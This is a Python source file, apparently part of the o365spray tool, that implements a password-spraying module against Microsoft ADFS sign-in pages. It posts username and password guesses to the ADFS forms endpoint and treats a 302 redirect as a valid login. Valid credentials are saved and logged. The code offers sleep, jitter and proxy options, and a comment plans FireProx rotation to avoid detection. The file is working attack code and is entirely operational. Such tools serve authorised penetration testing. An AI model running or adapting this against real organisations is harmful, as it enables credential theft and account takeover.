#!/usr/bin/env python3

import time
import logging
from urllib.parse import quote
from o365spray.core.utils import (
    Defaults,
    text_colors,
)
from o365spray.core.handlers.sprayer.modules.base import SprayerBase


class SprayModule_adfs(SprayerBase):
    """ADFS Sprayer module class"""

    def __init__(self, *args, **kwargs):
        """Initialize the parent base class"""
        super(SprayModule_adfs, self).__init__(*args, **kwargs)

    def _spray(self, domain: str, user: str, password: str):
        """Spray users via a managed ADFS server

        Arguments:
            domain: domain to spray
            user: username for authentication
            password: password for authentication

        Raises:
            Exception: generic handler so we can successfully fail without
              crashing the run
        """
        try:
            # Grab external headers from config.py
            headers = Defaults.HTTP_HEADERS

            # Build email if not already built
            email = self.HELPER.check_email(user, domain)

            # Write the tested user
            tested = f"{email}:{password}"
            if self.writer:
                self.tested_writer.write(tested)

            time.sleep(0.250)

            # Fix the ADFS URL for each user since the AuthUrl was pulled during
            # validation using a bogus user
            url, url_params = self.adfs_url.split("?", 1)
            url_params = url_params.split("&")
            for i in range(len(url_params)):
                if "username=" in url_params[i]:
                    url_params[i] = f"username={email}"
            url_params = "&".join(url_params)
            url = f"{url}?{url_params}"

            # TODO: Look into how to properly implement FireProx proxy URL here...

            data = f"UserName={quote(email)}&Password={quote(password)}&AuthMethod=FormsAuthentication"
            response = self._send_request(
                "post",
                url,
                data=data,
                headers=headers,
                proxies=self.proxies,
                timeout=self.timeout,
                sleep=self.sleep,
                jitter=self.jitter,
            )
            status = response.status_code

            if status == 302:
                if self.writer:
                    self.valid_writer.write(tested)
                self.VALID_CREDENTIALS.append(tested)
                logging.info(
                    f"[{text_colors.OKGREEN}VALID{text_colors.ENDC}] {email}:{password}"
                )
                # Remove valid user from being sprayed again
                self.userlist.remove(user)

            else:
                print(
                    f"[{text_colors.FAIL}INVALID{text_colors.ENDC}] "
                    f"{email}:{password}{' '*10}",
                    end="\r",
                )

        except Exception as e:
            logging.debug(e)
            pass
